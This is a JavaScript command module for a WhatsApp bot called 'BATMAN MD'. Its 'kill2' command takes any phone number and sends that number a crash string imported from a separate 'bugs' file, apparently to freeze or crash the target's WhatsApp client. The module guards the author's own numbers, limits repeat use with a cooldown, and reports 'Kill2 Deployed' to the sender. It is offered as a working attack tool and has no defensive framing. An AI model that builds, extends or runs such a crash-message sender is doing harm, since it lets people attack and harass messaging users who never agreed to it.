const fs = require('fs');
const path = require('path');
const { bugtext1 } = require('../bugs/bugtext1');  // Import the new crash string

// ============================================
// CONFIGURATION
// ============================================
const COOLDOWN_MINUTES = 10;
const COOLDOWN_MS = COOLDOWN_MINUTES * 60 * 1000;

// Protected numbers (your numbers)
const PROTECTED_NUMBERS = [
    '2347072182960',
    '2349049636843'
];

// Paths for data storage
const COOLDOWN_FILE = path.join(__dirname, '../data/kill2_cooldown.json');

// ============================================
// HELPER FUNCTIONS
// ============================================

// Ensure data directory exists
function ensureDataDir() {
    const dataDir = path.join(__dirname, '../data');
    if (!fs.existsSync(dataDir)) {
        fs.mkdirSync(dataDir, { recursive: true });
    }
}

// Load cooldown data
function loadCooldowns() {
    ensureDataDir();
    try {
        if (fs.existsSync(COOLDOWN_FILE)) {
            return JSON.parse(fs.readFileSync(COOLDOWN_FILE, 'utf8'));
        }
    } catch (e) {
        console.error('Error loading cooldowns:', e.message);
    }
    return {};
}

// Save cooldown data
function saveCooldowns(data) {
    ensureDataDir();
    try {
        fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
    } catch (e) {
        console.error('Error saving cooldowns:', e.message);
    }
}

// Check if user is on cooldown
function isOnCooldown(userId) {
    const cooldowns = loadCooldowns();
    const lastUsed = cooldowns[userId];
    if (!lastUsed) return false;
    return (Date.now() - lastUsed) < COOLDOWN_MS;
}

// Set cooldown for user
function setCooldown(userId) {
    const cooldowns = loadCooldowns();
    cooldowns[userId] = Date.now();
    saveCooldowns(cooldowns);
}

// Clean old cooldown entries
function cleanOldCooldowns() {
    const cooldowns = loadCooldowns();
    const now = Date.now();
    let changed = false;
    
    for (const [userId, timestamp] of Object.entries(cooldowns)) {
        if (now - timestamp > COOLDOWN_MS * 2) {
            delete cooldowns[userId];
            changed = true;
        }
    }
    
    if (changed) {
        saveCooldowns(cooldowns);
    }
}

// Clean old cooldowns every hour
setInterval(cleanOldCooldowns, 60 * 60 * 1000);

// Format number to JID
function toJid(number) {
    const cleanNumber = number.toString().replace(/[^0-9]/g, '');
    return `${cleanNumber}@s.whatsapp.net`;
}

// Validate phone number
function isValidNumber(number) {
    const clean = number.toString().replace(/[^0-9]/g, '');
    return clean.length >= 10 && clean.length <= 15;
}

// Get bot's own number
function getBotNumber(sock) {
    try {
        return sock.user.id.split(':')[0];
    } catch (e) {
        return null;
    }
}

// ============================================
// MAIN COMMAND FUNCTION
// ============================================
async function kill2Command(sock, chatId, message, args) {
    let reactionSent = false;
    
    try {
        // Extract target number from args
        const targetNumber = args?.trim();
        
        // ========== VALIDATION CHECKS ==========
        
        if (!targetNumber) {
            await sock.sendMessage(chatId, {
                text: `❌ *Usage:* ${global.prefix || '#'}kill2 <number>\n\nExample: ${global.prefix || '#'}kill2 2347xxxxxxxx`,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.newsletterJid || '120363367299421766@newsletter',
                        newsletterName: global.botname || 'BATMAN MD',
                        serverMessageId: -1
                    }
                }
            }, { quoted: message });
            return;
        }
        
        const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
        if (!isValidNumber(cleanNumber)) {
            await sock.sendMessage(chatId, {
                text: `❌ *Invalid phone number.*\n\nPlease provide a valid 10-15 digit number.\nExample: 23470xxxxxxxxx`,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.newsletterJid || '120363367299421766@newsletter',
                        newsletterName: global.botname || 'BATMAN MD',
                        serverMessageId: -1
                    }
                }
            }, { quoted: message });
            return;
        }
        
        const senderNumber = message.key.participant?.split('@')[0] || message.key.remoteJid?.split('@')[0];
        const botNumber = getBotNumber(sock);
        
        // Check protected numbers
        if (PROTECTED_NUMBERS.includes(cleanNumber)) {
            await sock.sendMessage(chatId, {
                text: `🛡️ *Protected Number*\n\nThis number is protected and cannot be targeted.`,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.newsletterJid || '120363367299421766@newsletter',
                        newsletterName: global.botname || 'BATMAN MD',
                        serverMessageId: -1
                    }
                }
            }, { quoted: message });
            return;
        }
        
        // Self-kill protection
        if (senderNumber === cleanNumber) {
            await sock.sendMessage(chatId, {
                text: `⚠️ *Nice try*\n\nYou cannot kill yourself.`,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.newsletterJid || '120363367299421766@newsletter',
                        newsletterName: global.botname || 'BATMAN MD',
                        serverMessageId: -1
                    }
                }
            }, { quoted: message });
            return;
        }
        
        // Bot self-protection
        if (botNumber === cleanNumber) {
            await sock.sendMessage(chatId, {
                text: `🤖 *Bot Protection*\n\nCannot kill the bot itself.`,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.newsletterJid || '120363367299421766@newsletter',
                        newsletterName: global.botname || 'BATMAN MD',
                        serverMessageId: -1
                    }
                }
            }, { quoted: message });
            return;
        }
        
        // Rate limit check
        const userIdentifier = `${senderNumber || chatId}`;
        if (isOnCooldown(userIdentifier)) {
            const cooldowns = loadCooldowns();
            const lastUsed = cooldowns[userIdentifier];
            const remainingSeconds = Math.ceil((COOLDOWN_MS - (Date.now() - lastUsed)) / 1000);
            const remainingMinutes = Math.floor(remainingSeconds / 60);
            const remainingSecs = remainingSeconds % 60;
            
            await sock.sendMessage(chatId, {
                text: `⏰ *Rate Limited*\n\nYou can use this command again in ${remainingMinutes}m ${remainingSecs}s.\nCooldown: ${COOLDOWN_MINUTES} minutes per user.`,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.newsletterJid || '120363367299421766@newsletter',
                        newsletterName: global.botname || 'BATMAN MD',
                        serverMessageId: -1
                    }
                }
            }, { quoted: message });
            return;
        }
        
        // ========== SEND THE KILL2 MESSAGE ==========
        
        // Send reaction
        await sock.sendMessage(chatId, { react: { text: '💀', key: message.key } });
        reactionSent = true;
        
        // Target JID
        const targetJid = toJid(cleanNumber);
        
        // Send the imported crash string from bugtext1.js
        await sock.sendMessage(targetJid, {
            text: bugtext1  // Imported from ../bugs/bugtext1.js
        });
        
        // Set cooldown
        setCooldown(userIdentifier);
        
        // Send confirmation
        await sock.sendMessage(chatId, {
            text: `💀 *Kill2 Deployed*\n\n📱 Target: ${cleanNumber}\n⏱️ Cooldown: ${COOLDOWN_MINUTES} minutes\n\nMessage sent successfully.`,
            contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: global.newsletterJid || '120363367299421766@newsletter',
                    newsletterName: global.botname || 'BATMAN MD',
                    serverMessageId: -1
                }
            }
        }, { quoted: message });
        
        // Remove reaction
        await sock.sendMessage(chatId, { react: { text: null, key: message.key } });
        reactionSent = false;
        
        console.log(`💀 Kill2 command executed by ${userIdentifier} targeting ${cleanNumber}`);
        
    } catch (error) {
        console.error('❌ Kill2 command error:', error.message);
        
        if (reactionSent) {
            try { await sock.sendMessage(chatId, { react: { text: null, key: message.key } }); } catch (_) {}
        }
        
        await sock.sendMessage(chatId, {
            text: `❌ *Failed to deploy kill2*\n\nError: ${error.message}\n\nThe target may have privacy settings enabled or the number is invalid.`,
            contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: global.newsletterJid || '120363367299421766@newsletter',
                    newsletterName: global.botname || 'BATMAN MD',
                    serverMessageId: -1
                }
            }
        }, { quoted: message });
    }
}

module.exports = kill2Command;